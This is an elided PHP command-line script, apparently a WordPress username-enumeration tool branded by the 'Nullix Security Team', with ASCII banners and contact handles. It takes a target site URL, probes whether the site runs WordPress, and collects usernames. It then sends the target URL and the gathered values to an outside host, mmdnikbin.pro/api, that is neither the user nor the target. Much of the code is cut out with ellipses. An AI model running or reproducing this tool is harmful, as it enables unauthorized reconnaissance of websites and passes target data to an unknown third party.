...
/*
 ...
 _   _       _ _ _        ____                       _ _         
| \ | |_   _| | (_)_  __ / ___|  ___  ___ _   _ _ __(_) |_ _   _ 
|  \| | | | | | | \ \/ / \___ \ / _ \/ __| | | | '__| | __| | | |
| |\  | |_| | | | |>  <   ___) |  __/ (__| |_| | |  | | |_| |_| |
|_| \_|\__,_|_|_|_/_/\_\ |____/ \___|\___|\__,_|_|  |_|\__|\__, |
                                                           |___/ 
 _____                    
|_   _|__  __ _ _ __ ___  
  ...
  |_|\___|\__,_|_| |_| |_|
	...
	*/ 
	...
	=========================================
 	=========================================
";echo "\033[0;37m 	==========Iranian Security Team==========
	==============Nullix Team================
";echo "\033[0;31m 	=========================================
	=========================================
	 =======================================
	...
	if($param == '-h'|| $param == '-help'|| $param == '--help' || $param == '--h'){
		echo "\033[1;33m To scan a target, Use: user$ ".$_SERVER["argv"][0]." https://www.NullixTM.com"."\033[0m".PHP_EOL;
		die;
	}
	if(empty($param))
	{
	    echo "\033[1;35m Using : WPusers.php https://Target.com ".PHP_EOL;
	    die;
	}
		  
	if (filter_var($param, FILTER_VALIDATE_URL) === FALSE) {
		print('Not a valid URL .. please use the full format eg: https://NullixTM.com')."\n";die;
	}
	...
	$count=1;
		...
		for($i=0;$i<=count($array);$i++){
			...
			if($res == 'HTTP/1.1 404 Not Found' || $res == 'HTTP/1.0 404 Not Found'){
			   if($i == 2){
				 echo "\033[2;33m Error [Just for Wordpress] "."\033[0m\n";
				 exit;
				}
			}
		}
		echo "\033[1;31m Finding users ... "."\033[0m".PHP_EOL;
		//sleep(1);
		echo "\033[1;33m
...
|  \| | | | | | | \ \/ / | |/ _ \/ _` | '_ ` _ \ 
| |\  | |_| | | | |>  <  | |  __/ (_| | | | | | |
|_| \_|\__,_|_|_|_/_/\_\ |_|\___|\__,_|_| |_| |_|
__________________________________________________    	";echo"\033[0;35m
                        ===================
			NikbinHK@yahoo.com
			===================
			T.me/Orrol
			===================
		";
		echo "\033[47m ---------Nullix Security Team---------";
		$mask = "|%5.5s ||%-30.40s\n";
		printf($mask,  '');
		echo "\n";
		//sleep(1);
		...
		echo "\033[1;31m  W8 ! ..."."\033[0m".PHP_EOL;
		...
		for($i=0;$i<=count($array);$i++){
			...
			$j++;
				...
				$url_1= ("https://www.mmdnikbin.pro/api/?wp=".trim($final));
			...
			$url = $_SERVER["argv"][1].'/';
			$d = sendRequest("https://www.mmdnikbin.pro/api/list.php?site=".$url);
